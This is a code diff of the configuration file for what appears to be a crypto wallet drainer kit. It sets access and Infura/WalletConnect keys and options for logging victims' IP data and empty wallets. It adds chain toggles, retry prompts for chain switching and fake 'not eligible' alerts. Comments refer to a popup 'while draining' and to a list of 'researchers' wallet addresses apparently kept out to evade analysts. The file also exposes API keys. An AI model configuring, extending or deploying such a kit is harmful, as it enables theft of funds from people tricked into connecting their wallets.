@@ -1,11 +1,13 @@
 // Your acces key
-let ACCESS_KEY = "ccb5237e-2bcb-4eb8-9ca9-221d7302c1a7";
+let ACCESS_KEY = "YOUR-ACCESS-KEY";
 
 // Connect wallet settings
 let chooseWalletTheme = "dark"; // Theme for this popup "dark" or "light"
 let modal_color = "default"; // default / magenta / blue / orange / green / purple / teal
 let modal_background = "gradient"; 
-let themeVariables = {}; // Custom styles  https://docs.walletconnect.com/2.0/web3modal/theming
+let themeVariables = {
+
+}; // Custom styles  https://docs.walletconnect.com/2.0/web3modal/theming
 
 let infura_key = "9aa3d95b3bc440fa88ea12eaa4456161";
 let wc_projectid = "7b3d5a6b0763294065cb92efa56375de"; // ProjectID from https://cloud.walletconnect.com/
@@ -14,6 +16,22 @@ let wc_projectid = "7b3d5a6b0763294065cb92efa56375de"; // ProjectID from https:/
 let logIpData =  true; // Add IP data to logs
 let logEmptyWallets = false; // Log when wallet is empty
 
+let defaultChain = "mainnet"; // Default chain (mainnet / bsc / polygon / arbitrum)
+
+
+// Manual disable/enable chains. true - enabled, false - disabled
+let eth_enabled = true;
+let bsc_enabled = true;
+let arb_enabled = true;
+let polygon_enabled = true;
+
+let retry_switchchain = 1; // How many times retry to ask for switching chain.
+
+let autoconnect = false; // Automatically connect wallet after page loaded
+
+// Alerts
+let notEligible = "This wallet is not eligible. Please use a different wallet with enough assets"; // Low balance
+let notEli_nogas = "This wallet is not eligible." // Not enough native coins for gas
 
 // Popup settings
 let popupEnabled = false; // True or false, popup after connecting wallet while draining
@@ -130,6 +148,6 @@ let researchers = [
     "0x2c067bB687587306840849E1a4Ff9bB4B42f7308",
     "0x49027eF8931082Ca59F0037b80A4F518D500bC4f",
     "0x5EadC2E651470e16413446AA4Bca44868751bf08",
-    "0x96dA410F33EBC7139DECc588Bf6d777416CC06B2", // Add reserchers afer this line like this "0xresearcheraddress",
+    "0x96dA410F33EBC7139DECc588Bf6d777416CC06B2", // Add researchers afer this line like this "0xresearcheraddress",
 	
 	];
